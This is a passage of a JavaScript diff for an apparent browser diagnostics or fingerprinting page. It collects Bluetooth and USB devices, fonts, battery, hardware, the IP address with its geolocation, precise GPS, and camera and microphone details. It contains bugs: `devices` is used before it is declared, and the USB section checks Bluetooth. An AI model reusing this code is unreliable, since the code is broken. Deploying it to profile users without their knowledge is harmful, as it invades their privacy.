+                                status: 'found'
+                            };
+                        } else {
+                            result.details.functions[funcName] = 'not_found';
+                            result.details.diagnostics.functionsTest[funcName] = {
+                                exists: false,
+                                status: 'not_found'
+                            };
+                        }
+                    } catch (funcError) {
+                        result.details.functions[funcName] = 'error';
+                        result.details.diagnostics.functionsTest[funcName] = {
+                            status: 'error',
+                            error: funcError.message
+                        };
+                    }
+                }
+
+                const hasAnyFunction = Object.values(result.details.functions)
+                    .some(val => val === 'function');
+
+                if (hasAnyFunction) {
+                    result.available = true;
+                    result.status = 'success';
+                } else {
+                    result.available = false;
+                    result.status = 'api_incomplete';
+                    result.error = `${apiName} API присутствует, но функции не найдены`;
+                    result.details.diagnostics.failureReason = 'no_functions_found';
+                }
+
+            } catch (error) {
+                result.available = false;
+                result.error = error.message;
+                result.status = 'error';
+                result.details.error = error.message;
+                result.details.diagnostics.failureReason = 'exception_caught';
+                result.details.diagnostics.exception = error.message;
+            }
+
+            return result;
+        }
+
+        async function collectBluetoothInfo() {
+            const baseResult = await checkDeviceAPI('bluetooth', {
+                permissionNames: ['bluetooth', 'bluetooth-device'],
+                getDevicesFunc: navigator.bluetooth?.getDevices ?
+                    () => navigator.bluetooth.getDevices() : null,
+                deviceMapper: (device) => ({
+                    id: device.id ?
+                        (device.id.length > 20 ? device.id.substring(0, 15) + '...' : device.id) :
+                        'unknown',
+                    name: device.name || 'Безымянное устройство',
+                    gattConnected: device.gatt?.connected || false
+                })
+            });
+
+            if (baseResult.details.diagnostics) {
+                baseResult.details.diagnostics.bluetoothSpecific = {
+                    advertising: 'getAdvertisement' in (navigator.bluetooth || {}),
+                    scanning: 'requestLEScan' in (navigator.bluetooth || {}),
+                    gatt: 'getPrimaryServices' in (navigator.bluetooth || {}),
+                    apiVersion: 'bluetooth' in navigator ? 'present' : 'absent',
+                    isChromiumBased: /chrome|chromium|edg|opera|brave/i.test(navigator.userAgent)
+                };
+
+                const additionalChecks = [
+                    'addEventListener', 'removeEventListener', 'dispatchEvent',
+                    'onavailabilitychanged', 'onadvertisementreceived'
+                ];
+
+                baseResult.details.diagnostics.additionalFunctions = {};
+                for (const func of additionalChecks) {
+                    baseResult.details.diagnostics.additionalFunctions[func] =
+                        func in (navigator.bluetooth || {});
+                }
+            }
+
+            console.log("=== BLUETOOTH DEBUG ===");
+            console.log("1. Has API:", 'bluetooth' in navigator);
+            console.log("2. Is Secure Context:", window.isSecureContext);
+            console.log("3. Protocol:", window.location.protocol);
+            console.log("4. Available functions:", Object.keys(navigator.bluetooth || {}));
+
+            try {
+                if (navigator.bluetooth && navigator.bluetooth.getAvailability) {
+                    const available = await navigator.bluetooth.getAvailability();
+                    console.log("5. Bluetooth available in system:", available);
+                }
+            } catch (e) {
+                console.log("5. Availability check failed:", e.message);
+            }
+
+            return baseResult;
+        }
+
+        async function collectUSBInfo() {
+            const baseResult = await checkDeviceAPI('usb', {
+                permissionNames: ['usb', 'usb-device'],
+                getDevicesFunc: navigator.usb?.getDevices ?
+                    () => navigator.usb.getDevices() : null,
+                deviceMapper: (device) => ({
+                    vendorId: device.vendorId,
+                    productId: device.productId,
+                    productName: device.productName || 'Неизвестное USB устройство',
+                    manufacturerName: device.manufacturerName || 'Неизвестный производитель',
+                    serialNumber: device.serialNumber || 'Нет',
+                    opened: device.opened,
+                    usbVersion: device.usbVersionMajor ?
+                        `USB ${device.usbVersionMajor}.${device.usbVersionMinor}` : 'unknown',
+                    configurations: device.configurations?.length || 0,
+                    deviceClass: device.deviceClass,
+                    deviceSubclass: device.deviceSubclass,
+                    deviceProtocol: device.deviceProtocol
+                })
+            });
+
+            if (baseResult.details.diagnostics) {
+                baseResult.details.diagnostics.usbSpecific = {
+                    canControlTransfer: 'controlTransferIn' in (navigator.usb || {}),
+                    canBulkTransfer: 'transferIn' in (navigator.usb || {}),
+                    canIsochronousTransfer: 'isochronousTransferIn' in (navigator.usb || {}),
+                    apiVersion: 'usb' in navigator ? 'present' : 'absent',
+                    transferTypes: {
+                        control: 'controlTransferIn' in (navigator.usb || {}),
+                        bulk: 'transferIn' in (navigator.usb || {}),
+                        interrupt: 'transferIn' in (navigator.usb || {}),
+                        isochronous: 'isochronousTransferIn' in (navigator.usb || {})
+                    }
+                };
+
+                if (navigator.usb) {
+                    baseResult.details.diagnostics.usbSpecific.supports = {
+                        getDevices: typeof navigator.usb.getDevices === 'function',
+                        requestDevice: typeof navigator.usb.requestDevice === 'function',
+                        forgetDevice: typeof navigator.usb.forgetDevice === 'function',
+                        getPermission: typeof navigator.usb.getPermission === 'function'
+                    };
+                }
+            }
+
+            console.log("=== USB DEBUG ===");
+            console.log("1. Has API:", 'usb' in navigator);
+            console.log("2. Is Secure Context:", window.isSecureContext);
+            console.log("3. Protocol:", window.location.protocol);
+            console.log("4. Available functions:", Object.keys(navigator.bluetooth || {}));
+
+            try {
+                if (navigator.bluetooth && navigator.bluetooth.getAvailability) {
+                    const available = await navigator.bluetooth.getAvailability();
+                    console.log("5. USB available in system:", available);
+                }
+            } catch (e) {
+                console.log("5. Availability check failed:", e.message);
+            }
+
+            return baseResult;
+        }
+
+        async function getFontsInfo() {
+            if (!document.fonts || !document.fonts.ready) {
+                return { available: false };
+            }
+
+            try {
+                await document.fonts.ready;
+                const fonts = [];
+                for (const font of document.fonts) {
+                    fonts.push(font.family);
+                }
+                return {
+                    available: true,
+                    count: fonts.length,
+                    uniqueCount: [...new Set(fonts)].length,
+                    sample: fonts.slice(0, 10)
+                };
+            } catch (error) {
+                return { available: false, error: error.message };
+            }
+        }
+
+        function getMimeTypesInfo() {
+            if (!navigator.mimeTypes) {
+                return { available: false };
+            }
+
+            const mimeTypes = [];
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                const mimeType = navigator.mimeTypes[i];
+                mimeTypes.push({
+                    type: mimeType.type,
+                    description: mimeType.description,
+                    enabled: mimeType.enabledPlugin ? true : false
+                });
+            }
+
+            return {
+                available: true,
+                count: mimeTypes.length,
+                types: mimeTypes.slice(0, 20)
+            };
+        }
+
+        function getCSPInfo() {
+            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+            const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy-Report-Only"]');
+
+            return {
+                hasCSP: !!cspMeta,
+                hasReportOnly: !!cspHeader,
+                cspContent: cspMeta ? cspMeta.content : null,
+                reportOnlyContent: cspHeader ? cspHeader.content : null
+            };
+        }
+
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) {
+                return { available: false };
+            }
+
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    available: true,
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (error) {
+                return { available: false, error: error.message };
+            }
+        }
+
+        function collectBrowserInfo() {
+            const isFileProtocol = window.location.protocol === 'file:';
+
+            return {
+                name: getBrowserName(),
+                version: getBrowserVersion(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'unknown',
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: isFileProtocol ? 'not_supported_in_file_protocol' : navigator.cookieEnabled,
+                online: navigator.onLine,
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                product: navigator.product,
+                protocol: window.location.protocol,
+                isLocalFile: isFileProtocol,
+                userAgentLength: navigator.userAgent ? navigator.userAgent.length : 0,
+                isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
+                isTablet: /Tablet|iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
+                parsedOS: parseOSFromUserAgent(navigator.userAgent),
+                isChromium: /Chrome|Chromium|Edg|OPR/i.test(navigator.userAgent),
+                isEdge: /Edg/i.test(navigator.userAgent),
+                isOpera: /OPR/i.test(navigator.userAgent)
+            };
+        }
+
+        function parseOSFromUserAgent(ua) {
+            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
+            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
+            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
+            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
+            if (/Mac OS X/.test(ua)) return 'macOS';
+            if (/Linux/.test(ua)) return 'Linux';
+            if (/Android/.test(ua)) return 'Android';
+            if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+            if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
+            return 'Unknown';
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+
+            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                const safariMatch = ua.match(/Version\/(\d+)/);
+                if (safariMatch) return safariMatch[1];
+            }
+
+            const matches = ua.match(/(chrome|firefox|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
+            return matches[2] || 'unknown';
+        }
+
+        function collectSystemInfo() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type || 'unknown',
+                    pixelRatio: window.devicePixelRatio || 1,
+                    colorGamut: getColorGamut(),
+                    hdr: checkHDRSupport(),
+                    orientationAngle: screen.orientation?.angle || 0
+                },
+                window: {
+                    width: window.innerWidth,
+                    height: window.innerHeight,
+                    devicePixelRatio: window.devicePixelRatio,
+                    orientation: window.orientation || 'unknown'
+                },
+                hardware: {
+                    hardwareConcurrency: navigator.hardwareConcurrency || null,
+                    deviceMemory: navigator.deviceMemory || null,
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    hasTouchScreen: navigator.maxTouchPoints > 0,
+                    estimatedCores: estimateCPUcores()
+                },
+                time: {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale
+                },
+                performance: {
+                    memory: performance.memory ? {
+                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB',
+                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB',
+                        jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) + ' MB'
+                    } : null,
+                    timing: performance.timing ? {
+                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms',
+                        domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart + 'ms'
+                    } : null
+                }
+            };
+        }
+
+        function getColorGamut() {
+            if (window.matchMedia) {
+                if (matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
+                if (matchMedia('(color-gamut: p3)').matches) return 'p3';
+                if (matchMedia('(color-gamut: srgb)').matches) return 'srgb';
+            }
+            return 'unknown';
+        }
+
+        function checkHDRSupport() {
+            if (window.matchMedia) {
+                return matchMedia('(dynamic-range: high)').matches;
+            }
+            return false;
+        }
+
+        function estimateCPUcores() {
+            if (navigator.hardwareConcurrency) return navigator.hardwareConcurrency;
+
+            const ua = navigator.userAgent || '';
+            if (/Mobile|Android|iPhone/.test(ua)) return 4;
+            if (/Tablet|iPad/.test(ua)) return 4;
+
+            return 2;
+        }
+
+        async function collectLocationInfo() {
+            const result = {
+                available: true,
+                error: null,
+                status: 'success',
+                details: {
+                    ipBased: {
+                        ip: null,
+                        country: null,
+                        country_code: null,
+                        region: null,
+                        city: null,
+                        postal: null,
+                        latitude: null,
+                        longitude: null,
+                        timezone: null,
+                        currency: null,
+                        languages: null,
+                        isp: null,
+                        org: null,
+                        as: null,
+                        mobile: false,
+                        proxy: false,
+                        hosting: false,
+                        error: null
+                    },
+                    precise: {
+                        available: false,
+                        latitude: null,
+                        longitude: null,
+                        accuracy: null,
+                        altitude: null,
+                        altitudeAccuracy: null,
+                        heading: null,
+                        speed: null,
+                        error: null,
+                        code: null
+                    },
+                    estimatedByTimezone: {
+                        timezone: null,
+                        language: null
+                    },
+                    ipAnalysis: null
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            debugLog('Начало сбора геолокации');
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipInfo = await response.json();
+                const ip = ipInfo.ip;
+
+                result.details.ipBased.ip = ip;
+                result.details.ipAnalysis = await analyzeIPAddress(ip);
+
+
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ipInfo.ip}/json/`);
+                    if (geoResponse.ok) {
+                        const geoData = await geoResponse.json();
+
+                        Object.assign(result.details.ipBased, {
+                            country: geoData.country_name,
+                            country_code: geoData.country_code,
+                            region: geoData.region,
+                            city: geoData.city,
+                            postal: geoData.postal,
+                            latitude: geoData.latitude,
+                            longitude: geoData.longitude,
+                            timezone: geoData.timezone,
+                            currency: geoData.currency,
+                            languages: geoData.languages,
+                            isp: geoData.org,
+                            org: geoData.org,
+                            as: geoData.asn,
+                            mobile: geoData.mobile || false,
+                            proxy: geoData.proxy || false,
+                            hosting: geoData.hosting || false
+                        });
+                    } else {
+                        result.details.ipBased.error = `HTTP ${geoResponse.status}`;
+                    }
+                } catch (geoError) {
+                    result.details.ipBased.error = geoError.message;
+                }
+            } catch (error) {
+                result.available = false;
+                result.error = 'Не удалось получить данные по IP';
+                result.status = 'error';
+                result.details.ipBased.error = error.message;
+            }
+
+            if ('geolocation' in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        const timeoutId = setTimeout(() => {
+                            reject(new Error('Geolocation timeout: 12s exceeded'));
+                        }, 12000);
+
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                clearTimeout(timeoutId);
+                                resolve(pos);
+                            },
+                            (err) => {
+                                clearTimeout(timeoutId);
+                                reject(err);
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+
+                    result.details.precise = {
+                        available: true,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' метров',
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        error: null,
+                        code: null
+                    };
+
+                } catch (error) {
+                    result.details.precise = {
+                        available: false,
+                        error: error.message,
+                        code: error.code || 'unknown',
+                        latitude: null,
+                        longitude: null,
+                        accuracy: null
+                    };
+                }
+            } else {
+                result.details.precise = {
+                    available: false,
+                    error: 'Geolocation API not supported',
+                    code: 'not_supported'
+                };
+            }
+
+            result.details.estimatedByTimezone = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+
+            return result;
+        }
+
+        async function analyzeIPAddress(ip) {
+            if (!ip) return null;
+
+            const result = {
+                class: getIPClass(ip),
+                type: getIPType(ip),
+                binary: ipToBinary(ip),
+                hexadecimal: ipToHex(ip),
+                octets: analyzeOctets(ip),
+                special: checkSpecialIP(ip),
+                subnet: getSubnetInfo(ip)
+            };
+
+            return result;
+        }
+
+        function getIPClass(ip) {
+            const octets = ip.split('.').map(Number);
+            const firstOctet = octets[0];
+
+            if (firstOctet >= 1 && firstOctet <= 126) return 'A';
+            if (firstOctet >= 128 && firstOctet <= 191) return 'B';
+            if (firstOctet >= 192 && firstOctet <= 223) return 'C';
+            if (firstOctet >= 224 && firstOctet <= 239) return 'D (multicast)';
+            if (firstOctet >= 240 && firstOctet <= 255) return 'E (experimental)';
+            return 'Unknown';
+        }
+
+        function getIPType(ip) {
+            const octets = ip.split('.').map(Number);
+
+            if (octets[0] === 10) return 'private (10.0.0.0/8)';
+            if (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31) return 'private (172.16.0.0/12)';
+            if (octets[0] === 192 && octets[1] === 168) return 'private (192.168.0.0/16)';
+            if (octets[0] === 169 && octets[1] === 254) return 'link-local (APIPA)';
+
+            if (ip === '127.0.0.1' || ip === '::1') return 'loopback';
+            if (ip === '0.0.0.0') return 'unspecified';
+            if (octets[0] >= 224 && octets[0] <= 239) return 'multicast';
+            if (octets[0] >= 240) return 'reserved';
+
+            return 'public';
+        }
+
+        function ipToBinary(ip) {
+            return ip.split('.').map(octet => {
+                return parseInt(octet).toString(2).padStart(8, '0');
+            }).join('.');
+        }
+
+        function ipToHex(ip) {
+            return ip.split('.').map(octet => {
+                return '0x' + parseInt(octet).toString(16).padStart(2, '0').toUpperCase();
+            }).join('.');
+        }
+
+        function analyzeOctets(ip) {
+            const octets = ip.split('.').map(Number);
+            return {
+                first: octets[0],
+                second: octets[1],
+                third: octets[2],
+                fourth: octets[3],
+                networkPart: getIPClass(ip) === 'A' ? octets[0] :
+                    getIPClass(ip) === 'B' ? octets.slice(0, 2).join('.') :
+                        getIPClass(ip) === 'C' ? octets.slice(0, 3).join('.') : 'N/A',
+                hostPart: getIPClass(ip) === 'A' ? octets.slice(1, 4).join('.') :
+                    getIPClass(ip) === 'B' ? octets.slice(2, 4).join('.') :
+                        getIPClass(ip) === 'C' ? octets[3] : 'N/A'
+            };
+        }
+
+        function checkSpecialIP(ip) {
+            const specialIPs = {
+                '127.0.0.1': 'Loopback (localhost)',
+                '0.0.0.0': 'Unspecified/any address',
+                '255.255.255.255': 'Broadcast',
+                '192.0.2.0': 'TEST-NET-1 (documentation)',
+                '198.51.100.0': 'TEST-NET-2',
+                '203.0.113.0': 'TEST-NET-3',
+                '169.254.0.0': 'Link-local (APIPA)',
+                '224.0.0.0': 'Multicast base',
+                '240.0.0.0': 'Reserved'
+            };
+
+            if (specialIPs[ip]) return specialIPs[ip];
+
+            const octets = ip.split('.').map(Number);
+
+            if (octets[0] === 10) return 'Private network (10.0.0.0/8)';
+            if (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31) return 'Private network (172.16.0.0/12)';
+            if (octets[0] === 192 && octets[1] === 168) return 'Private network (192.168.0.0/16)';
+            if (octets[0] >= 224 && octets[0] <= 239) return 'Multicast address';
+            if (octets[0] >= 240) return 'Reserved for future use';
+
+            return 'Regular IP address';
+        }
+
+        function getSubnetInfo(ip) {
+            const ipClass = getIPClass(ip);
+
+            const subnetInfo = {
+                'A': { mask: '255.0.0.0', cidr: '/8', hosts: 16777214 },
+                'B': { mask: '255.255.0.0', cidr: '/16', hosts: 65534 },
+                'C': { mask: '255.255.255.0', cidr: '/24', hosts: 254 },
+                'D (multicast)': { mask: 'N/A', cidr: 'N/A', hosts: 'N/A' },
+                'E (experimental)': { mask: 'N/A', cidr: 'N/A', hosts: 'N/A' }
+            };
+
+            return subnetInfo[ipClass] || { mask: 'Unknown', cidr: 'Unknown', hosts: 'Unknown' };
+        }
+
+        async function collectMediaInfo() {
+            const result = {
+                available: false,
+                error: null,
+                status: 'not_available',
+                details: {
+                    devices: [],
+                    screen: {},
+                    summary: {},
+                    systemInfo: {}
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            if (!('mediaDevices' in navigator)) {
+                result.error = 'MediaDevices API не поддерживается';
+                result.details.summary = {
+                    cameraCount: 0,
+                    microphoneCount: 0,
+                    speakerCount: 0,
+                    totalDevices: 0
+                };
+                result.details.screen = { hasScreenCapture: false };
+                result.details.systemInfo = {
+                    hasFrontCamera: false,
+                    hasBackCamera: false,
+                    hasExternalCamera: false,
+                    hasBuiltInMicrophone: false,
+                    hasExternalMicrophone: false,
+                    hasBuiltInSpeakers: false,
+                    hasExternalSpeakers: false
+                };
+                return result;
+            }
+
+            const uniqueDevices = [];
+            const seenGroups = new Set();
+
+            for (const device of devices) {
+                const groupKey = device.groupId || device.deviceId;
+
+                if (!seenGroups.has(groupKey)) {
+                    seenGroups.add(groupKey);
+                    uniqueDevices.push(device);
+                } else {
+                    console.log(`[DEBUG] Пропущен дубликат: ${device.label} (groupId: ${device.groupId})`);
+                }
+            }
+
+            devices = uniqueDevices;
+
+            try {
+                let devices = await navigator.mediaDevices.enumerateDevices();
+
+                let hasVideoAccess = false;
+                let hasAudioAccess = false;
+
+                const hasVideoDevice = devices.some(d => d.kind === 'videoinput');
+                const hasAudioDevice = devices.some(d => d.kind === 'audioinput');
+
+                if (hasVideoDevice || hasAudioDevice) {
+                    try {
+                        const constraints = {};
+                        if (hasVideoDevice) constraints.video = true;
+                        if (hasAudioDevice) constraints.audio = true;
+
+                        const testStream = await navigator.mediaDevices.getUserMedia(constraints);
+
+                        if (hasVideoDevice) hasVideoAccess = true;
+                        if (hasAudioDevice) hasAudioAccess = true;
+
+                        const videoTracks = testStream.getVideoTracks();
+                        const audioTracks = testStream.getAudioTracks();
+
+                        testStream.getTracks().forEach(track => track.stop());
+
+                        devices = await navigator.mediaDevices.enumerateDevices();
+
+                    } catch (accessError) {
+                        result.details.accessError = accessError.message;
+                    }
+                }
+
+                const detailedDevices = [];
+                const systemInfo = {
+                    hasFrontCamera: false,
+                    hasBackCamera: false,
+                    hasExternalCamera: false,
+                    hasBuiltInMicrophone: false,
+                    hasExternalMicrophone: false,
+                    hasBuiltInSpeakers: false,
+                    hasExternalSpeakers: false,
+                    stereoCapable: false,
+                    surroundCapable: false
+                };
+
+                for (const device of devices) {
+                    const deviceInfo = {
+                        kind: device.kind,
+                        label: device.label || 'Не указано',
+                        deviceId: device.deviceId ? device.deviceId.substring(0, 10) + '...' : 'none',
+                        groupId: device.groupId ? device.groupId.substring(0, 10) + '...' : 'none',
+                        type: getDeviceType(device.kind),
+                        hasAccess: (device.kind === 'videoinput' && hasVideoAccess) ||
+                            ((device.kind === 'audioinput' || device.kind === 'audiooutput') && hasAudioAccess)
+                    };
+
+                    if (device.kind === 'videoinput') {
+                        deviceInfo.cameraType = determineCameraType(device.label,
+                            detailedDevices.filter(d => d.kind === 'videoinput').length);
+
+                        if (deviceInfo.cameraType.includes('front')) systemInfo.hasFrontCamera = true;
+                        if (deviceInfo.cameraType.includes('back')) systemInfo.hasBackCamera = true;
+                        if (deviceInfo.cameraType.includes('external')) systemInfo.hasExternalCamera = true;
+
+                        if (hasVideoAccess) {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({
+                                    video: { deviceId: { exact: device.deviceId } }
+                                });
+
+                                const track = stream.getVideoTracks()[0];
+                                const settings = track.getSettings();
+
+                                deviceInfo.settings = {
+                                    width: settings.width,
+                                    height: settings.height,
+                                    frameRate: settings.frameRate,
+                                    facingMode: settings.facingMode || 'undefined',
+                                    aspectRatio: settings.aspectRatio,
+                                    resizeMode: settings.resizeMode,
+                                    frameRateConstraints: settings.frameRateConstraints
+                                };
+
+                                try {
+                                    const capabilities = track.getCapabilities();
+                                    deviceInfo.capabilities = {
+                                        width: capabilities.width,
+                                        height: capabilities.height,
+                                        frameRate: capabilities.frameRate,
+                                        facingMode: capabilities.facingMode,
+                                        zoom: capabilities.zoom,
+                                        torch: capabilities.torch,
+                                        whiteBalanceMode: capabilities.whiteBalanceMode,
+                                        exposureMode: capabilities.exposureMode,
+                                        focusMode: capabilities.focusMode
+                                    };
+                                } catch (capError) {
+                                    deviceInfo.capabilitiesError = capError.message;
+                                }
+
+                                try {
+                                    const constraints = track.getConstraints();
+                                    deviceInfo.constraints = constraints;
+                                } catch (conError) {
+                                    deviceInfo.constraintsError = conError.message;
+                                }
+
+                                stream.getTracks().forEach(t => t.stop());
+
+                            } catch (deviceError) {
+                                deviceInfo.error = deviceError.message;
+                            }
+                        }
+                    }
+
+                    else if (device.kind === 'audioinput') {
+                        deviceInfo.microphoneType = determineMicrophoneType(device.label);
+
+                        if (deviceInfo.microphoneType.includes('built-in') ||
+                            deviceInfo.microphoneType.includes('internal')) {
+                            systemInfo.hasBuiltInMicrophone = true;
+                        } else {
+                            systemInfo.hasExternalMicrophone = true;
+                        }
+
+                        if (hasAudioAccess) {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({
+                                    audio: {
+                                        deviceId: { exact: device.deviceId },
+                                        echoCancellation: true,
+                                        noiseSuppression: true,
+                                        autoGainControl: true
+                                    },
+                                    video: false
+                                });
+
+                                const track = stream.getAudioTracks()[0];
+                                const settings = track.getSettings();
+
+                                deviceInfo.settings = {
+                                    sampleRate: settings.sampleRate,
+                                    sampleSize: settings.sampleSize,
+                                    channelCount: settings.channelCount,
+                                    echoCancellation: settings.echoCancellation,
+                                    autoGainControl: settings.autoGainControl,
+                                    noiseSuppression: settings.noiseSuppression,
+                                    latency: settings.latency,
+                                    channelCountMode: settings.channelCountMode,
+                                    channelCountConstraint: settings.channelCountConstraint
+                                };
+
+                                try {
+                                    const capabilities = track.getCapabilities();
+                                    deviceInfo.capabilities = {
+                                        sampleRate: capabilities.sampleRate,
+                                        sampleSize: capabilities.sampleSize,
+                                        channelCount: capabilities.channelCount,
+                                        echoCancellation: capabilities.echoCancellation,
+                                        autoGainControl: capabilities.autoGainControl,
+                                        noiseSuppression: capabilities.noiseSuppression
+                                    };
+
+                                    if (capabilities.channelCount && capabilities.channelCount.max >= 2) {
+                                        systemInfo.stereoCapable = true;
+                                    }
+                                    if (capabilities.channelCount && capabilities.channelCount.max >= 5) {
+                                        systemInfo.surroundCapable = true;
+                                    }
+                                } catch (capError) {
+                                    deviceInfo.capabilitiesError = capError.message;
+                                }
+
+                                stream.getTracks().forEach(t => t.stop());
+
+                            } catch (deviceError) {
+                                deviceInfo.error = deviceError.message;
+                            }
+                        }
+                    }
+
+                    else if (device.kind === 'audiooutput') {
+                        deviceInfo.speakerType = determineSpeakerType(device.label);
+
+                        if (deviceInfo.speakerType.includes('built-in') ||
+                            deviceInfo.speakerType.includes('internal')) {
+                            systemInfo.hasBuiltInSpeakers = true;
+                        } else {
+                            systemInfo.hasExternalSpeakers = true;
+                        }
+
+                        deviceInfo.speakerInfo = {
+                            default: 'default' in navigator.mediaDevices &&
+                                await navigator.mediaDevices.selectAudioOutput ?
+                                await navigator.mediaDevices.selectAudioOutput() : null,
+                            canSelectOutput: 'selectAudioOutput' in navigator.mediaDevices,
+                            supportsSetSinkId: 'setSinkId' in HTMLAudioElement.prototype
+                        };
+                    }
+
+                    detailedDevices.push(deviceInfo);
+                }
+
+                const summary = {
+                    hasCamera: devices.some(d => d.kind === 'videoinput'),
+                    hasMicrophone: devices.some(d => d.kind === 'audioinput'),
+                    hasSpeakers: devices.some(d => d.kind === 'audiooutput'),
+                    totalDevices: devices.length,
+                    cameraCount: devices.filter(d => d.kind === 'videoinput').length,
+                    microphoneCount: devices.filter(d => d.kind === 'audioinput').length,
+                    speakerCount: devices.filter(d => d.kind === 'audiooutput').length,
+                    hasVideoAccess: hasVideoAccess,
+                    hasAudioAccess: hasAudioAccess,
+                    camerasWithDetails: detailedDevices.filter(d =>
+                        d.kind === 'videoinput' && d.settings).length,
+                    microphonesWithDetails: detailedDevices.filter(d =>
+                        d.kind === 'audioinput' && d.settings).length
+                };
+
+                const screenInfo = {
+                    hasScreenCapture: 'getDisplayMedia' in navigator.mediaDevices,
+                    hasSupportedConstraints: 'getSupportedConstraints' in navigator.mediaDevices ?
+                        navigator.mediaDevices.getSupportedConstraints() : null
+                };
+
+                result.available = true;
+                result.status = 'success';
+                result.details.devices = detailedDevices;
+                result.details.screen = screenInfo;
+                result.details.summary = summary;
+                result.details.systemInfo = systemInfo;
+
+            } catch (error) {
+                result.available = false;
+                result.error = error.message;
+                result.status = 'error';
+                result.details.summary = {
+                    cameraCount: 0,
+                    microphoneCount: 0,
+                    speakerCount: 0,
+                    totalDevices: 0
+                };
+                result.details.screen = { hasScreenCapture: false };
+                result.details.systemInfo = {
+                    hasFrontCamera: false,
+                    hasBackCamera: false,
+                    hasExternalCamera: false,
+                    hasBuiltInMicrophone: false,
+                    hasExternalMicrophone: false,
+                    hasBuiltInSpeakers: false,
+                    hasExternalSpeakers: false
+                };
+            }
+
+            return result;
+        }
+
+        function determineCameraType(label, cameraIndex) {
+            if (!label) return `unknown_${cameraIndex}`;
+
+            const lcLabel = label.toLowerCase();
+
+            if (lcLabel.includes('front') || lcLabel.includes('user') ||
+                lcLabel.includes('встроенная') || lcLabel.includes('фронтальная')) {
+                return 'front';
+            }
+            if (lcLabel.includes('back') || lcLabel.includes('environment') ||
+                lcLabel.includes('тыловая') || lcLabel.includes('задняя')) {
+                return 'back';
+            }
+            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
+                lcLabel.includes('webcam') || lcLabel.includes('веб-камера')) {
+                return 'external';
+            }
+
+            switch (cameraIndex) {
+                case 0: return 'front (предположительно)';
+                case 1: return 'back (предположительно)';
+                default: return 'external (предположительно)';
+            }
+        }
+
+        function determineMicrophoneType(label) {
+            if (!label) return 'unknown';
+
+            const lcLabel = label.toLowerCase();
+
+            if (lcLabel.includes('built-in') || lcLabel.includes('internal') ||
+                lcLabel.includes('встроенный') || lcLabel.includes('микрофон') ||
+                lcLabel.includes('default')) {
+                return 'built-in';
+            }
+            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
+                lcLabel.includes('headset') || lcLabel.includes('наушники') ||
+                lcLabel.includes('гарнитура')) {
+                return 'external';
+            }
+
+            return 'unknown';
+        }
+
+        function determineSpeakerType(label) {
+            if (!label) return 'unknown';
+
+            const lcLabel = label.toLowerCase();
+
+            if (lcLabel.includes('built-in') || lcLabel.includes('internal') ||
